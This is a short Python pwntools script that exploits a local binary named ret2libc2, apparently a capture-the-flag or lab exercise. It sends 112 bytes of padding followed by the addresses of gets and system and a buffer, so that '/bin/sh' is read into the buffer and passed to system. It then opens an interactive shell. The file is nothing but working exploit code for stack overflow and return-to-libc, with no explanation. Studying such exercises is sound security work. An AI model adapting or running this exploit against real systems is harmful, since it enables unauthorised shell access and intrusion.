#! /usr/bin/python3

from pwn import*

sh=process('./ret2libc2')

system_addr = 0x08048490
gets_addr   = 0x08048460
buf2_addr   = 0x0804A080


payload=flat([112 * b'A', \
              gets_addr, \
              system_addr, \
              buf2_addr, \
              buf2_addr])

sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()

